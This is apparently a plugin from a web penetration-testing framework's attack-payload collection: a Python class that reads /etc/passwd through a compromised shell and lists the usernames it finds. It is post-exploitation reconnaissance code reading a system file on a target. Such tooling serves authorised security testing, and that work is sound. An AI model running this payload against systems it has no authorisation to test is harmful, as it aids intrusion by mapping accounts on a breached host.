import re
from plugins.attack.payloads.base_payload import base_payload

class users_name(base_payload):
    '''
    This payload shows users name
    '''
    def api_read(self):
        result = []
        users = []

        def parse_users_name( etc_passwd ):
            user = re.findall('^(.*?)\:', etc_passwd,  re.MULTILINE)
            if user:
                return user
            else:
                return ''

        passwd = self.shell.read('/etc/passwd')
        if passwd:
            for user in parse_users_name(passwd):
                result.append(str(user))
        return result
    
    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('Users name not found.')
        return result
